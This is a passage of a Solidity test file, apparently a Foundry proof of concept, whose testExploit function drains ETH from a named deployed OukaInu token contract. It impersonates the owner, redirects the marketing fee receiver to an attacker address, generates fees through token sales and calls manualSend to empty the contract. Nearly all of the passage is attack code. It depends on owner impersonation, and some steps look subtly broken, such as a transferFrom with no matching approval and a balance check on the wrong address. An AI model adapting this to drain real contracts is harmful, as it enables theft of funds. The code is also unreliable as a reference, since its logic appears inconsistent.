    function testExploit() public {
        // Get the owner address
        address owner = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).getOwner();

        // Record initial attacker balance
        uint256 initialBalance = address(this).balance;

        // Start impersonating the owner
        vm.startPrank(owner);

        // First, enable trading if not already enabled
        try OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET).tradingStatus(true) {}
        catch {}

        // Change marketingFeeReceiver to attacker address
        // Get current autoLiquidityReceiver first (we need to keep it to avoid issues)
        // For simplicity, set marketingFeeReceiver to attacker, keep others as is
        OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01 token = OukaInu_0x4A33D3ea4B30228C363222746939562FbAba2f01(TARGET);

        // We'll use the existing autoLiquidityReceiver address from constructor
        address autoLiquidityReceiver = 0xe1e7703841b16d61c23Fdf61d5F5Be6a88c293BB;
        address buyBackFeeReceiver = 0x7B607249675C40733E13db4221386822f94B46aa;
        address developmentFeeReceiver = 0x0BdFc49D8F691f0d993d013e74F83405b77387b4;
        address charityFeeReceiver = 0xeeC03165D878e6634A1Fa2e242760d4fB5711849;
        address stakingFeeReceiver = 0x8B543639C657ADf1a5e2F4D839a9F680107faeA6;

        token.setFeeReceivers(
            autoLiquidityReceiver,
            attacker,  // marketingFeeReceiver - changed to attacker
            buyBackFeeReceiver,
            developmentFeeReceiver,
            charityFeeReceiver,
            stakingFeeReceiver
        );

        // Also make attacker fee exempt and tx limit exempt to avoid issues
        token.setIsFeeExempt(attacker, true);
        token.setIsTxLimitExempt(attacker, true);

        vm.stopPrank();

        // Now we need to get some ETH into the contract
        // Buy tokens to generate fees
        // First, get some OUKA tokens to sell
        // The owner has all tokens initially, so we need to get some
        vm.startPrank(owner);

        // Transfer some tokens to attacker so we can sell them
        token.transfer(attacker, token.balanceOf(owner) / 100);  // Transfer 1% of supply

        vm.stopPrank();

        // Approve router to spend our tokens
        token.approve(address(token.router()), type(uint256).max);

        // Sell some tokens to generate ETH fees for the contract
        // This will put ETH into contract from fees
        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = token.WBNB();

        // Get router address
        IDEXRouter router = IDEXRouter(token.router());

        // Sell tokens
        uint256 tokensToSell = token.balanceOf(attacker) / 10;  // Sell 10% of what we have
        token.transferFrom(attacker, address(this), tokensToSell);  // Move to test contract

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokensToSell,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Now contract should have ETH from fees
        uint256 contractETH = TARGET.balance;
        require(contractETH > 0, "Contract should have ETH from fees");

        // Record attacker balance before drain
        uint256 balanceBefore = address(this).balance;

        // Impersonate owner to drain funds
        vm.startPrank(owner);

        // Use manualSend() which sends ALL ETH to marketingFeeReceiver
        token.manualSend();

        vm.stopPrank();

        // Verify attacker received ETH
        uint256 balanceAfter = address(this).balance;
        require(balanceAfter > balanceBefore, "Attacker should have more ETH");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

